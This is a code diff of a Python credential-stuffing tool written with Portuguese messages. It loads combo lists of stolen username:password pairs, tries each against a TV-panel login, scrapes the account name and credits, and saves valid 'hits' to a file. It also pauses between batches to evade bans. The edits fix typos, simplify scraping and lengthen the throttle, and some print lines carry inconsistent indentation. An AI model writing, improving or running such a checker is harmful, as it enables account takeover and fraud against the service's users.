@@ -87,23 +87,30 @@ def login_and_get_dashboard(username, password, base_url):
                 'upgrade-insecure-requests': '1'
             }
 
-            dashboard _response = session.get(dashboard_url, headers=dashboard_headers, verify=False)
+            dashboard_response = session.get(dashboard_url, headers=dashboard_headers, verify=False)
             soup = BeautifulSoup(dashboard_response.text, 'html.parser')
 
-            credits_element = soup.find('spam', class_='credits_badge')
-            credits = credits_element.text.split(': ')[1] if credits_element else 'Créditos não encontrados'
-
-            name_element = soup.find('div', class_='user-panel')
-            if name_element:
-                name_element = name_element.find('a', class_='d-block')
-                name = name_element.text.split(', ')[1] if name_element else username
-            else:
-                name = username
+            name = soup.find('span', {'class': 'username'}).text
+            credits = soup.find('span', {'class': 'credits'}).text
 
             return name, credits, base_url
-    except Exception as e:
-        print(f"Erro ao processar login: {str(e)}")
+    except requests.exceptions.RequestException as e:
+        print(f"Erro ao conectar ao site: {e}")
         return None, None, base_url
+
+def process_account(username, password, i, total, base_url):
+    name, credits, base_url = login_and_get_dashboard(username, password, base_url)
+
+    if name is not None:
+            print(VERDE + f"\n==[ Login válido ]==\n • User: {username}\n • Pass: {password}" + RESET)
+        print(f" ===<use infos/>===\n • Nome: {name}")
+        print(f" • Créditos: {credits}")
+        with open("/content/drive/MyDrive/_Paineis/combo/hits/one_tv_hits.txt", "a") as hit_file:
+            hit_file.write(f"\n===<Sr.Hell/>===\n• User: {username}\n• Pass: {password}\n• URL: {base_url}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
+        return True
+    else:
+        print(VERMELHO + f"\nLogin inválido: {username}:{password}" + RESET)
+        return False
 
 def listar_arquivos_combo():
     diretorio = "/content/drive/MyDrive/_Paineis/combo"
@@ -120,20 +127,6 @@ def listar_arquivos_combo():
         print("Nenhum arquivo .txt encontrado na pasta.")
         return None
 
-def process_account(user, password, i, total, base_url):
-    print(f"Verificando {i}/{total}", end="\r")
-    name, credits, base_url = login_and_get_dashboard(user, password, base_url)
-    if name and credits:
-            print(VERDE + f"\n==[ Login válido ]==\n • User: {user}\n • Pass: {password}" + RESET)
-        print(f" ===<use infos/>===\n • Nome: {name}")
-        print(f" • Créditos: {credits}")
-        with open("/content/drive/MyDrive/_Paineis/combo/hits/one_tv_hits.txt", "a") as hit_file:
-            hit_file.write(f"\n===<Sr.Hell/>===\n• User: {user}\n• Pass: {password}\n• URL: {base_url}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
-        return True
-    else:
-        print(VERMELHO + f"\nLogin inválido: {user}:{password}" + RESET)
-        return False
-
 def main():
     clear_screen()
     terminal_size = get_terminal_size()
@@ -141,8 +134,8 @@ def main():
     centered_art = center_text(ascii_art, terminal_size.columns)
     signature = center_text("Don't pay for something 'free'.\n\n", terminal_size.columns)
     
-    baner = f"{GREEN}{centered_art}\n\n{signature}{RESET}"
-    print(baner)
+    banner = f"{GREEN}{centered_art}\n\n{signature}{RESET}"
+    print(banner)
     
     arquivo_combo = listar_arquivos_combo()
     
@@ -178,7 +171,7 @@ def main():
 
             if len(futures) % 100 == 0:
                 print(AZUL + "\nPausando por 0.5 segundos para evitar banimento..." + RESET)
-                time.sleep(0.1)
+                time.sleep(0.5)
 
     print(f"\nTotal de válidos: {validos}/{total}\n")
 
